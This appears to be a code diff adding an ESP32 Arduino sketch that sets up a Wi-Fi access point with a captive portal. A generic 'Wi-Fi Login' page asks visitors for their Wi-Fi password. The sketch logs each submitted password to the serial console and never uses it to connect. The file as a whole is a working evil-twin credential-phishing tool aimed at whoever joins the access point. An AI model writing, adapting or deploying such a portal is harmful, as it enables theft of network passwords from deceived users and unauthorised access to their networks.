@@ -1,0 +1,63 @@
+#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <DNSServer.h>
+
+const char* apSSID = "my";  // Wi-Fi Name (ESP32 in AP Mode)
+const char* apPassword = "womt7011";  // Wi-Fi Password
+
+AsyncWebServer server(80);
+DNSServer dnsServer;
+
+// HTML Form Page
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wi-Fi Login</title>
+</head>
+<body>
+    <h2>Enter Wi-Fi Password</h2>
+    <form action="/submit" method="post">
+        <label for="wifi_pass">Wi-Fi Password:</label>
+        <input type="password" id="wifi_pass" name="wifi_pass">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
+)rawliteral";
+
+void setup() {
+    Serial.begin(115200);
+
+    // Start ESP32 as an Access Point
+    WiFi.softAP(apSSID, apPassword);
+    Serial.println("WiFi Access Point Started");
+
+    // Setup DNS Server for Captive Portal
+    dnsServer.start(53, "*", WiFi.softAPIP());
+
+    // Redirect all requests to the captive portal page
+    server.onNotFound([](AsyncWebServerRequest *request){
+        request->redirect("http://mycustomdomain.com"); // Replace with your domain
+    });
+
+    // Serve the HTML form
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", index_html);
+    });
+
+    // Handle form submission
+    server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
+        if (request->hasParam("wifi_pass", true)) {
+            String wifiPassword = request->getParam("wifi_pass", true)->value();
+            Serial.println("Received Wi-Fi Password: " + wifiPassword);
+        }
+        request->send(200, "text/plain", "Password Received!");
+    });
+
+    server.begin();
+}
+
+void loop() {
+    dnsServer.processNextRequest();  // Keep Captive Portal Running
+}
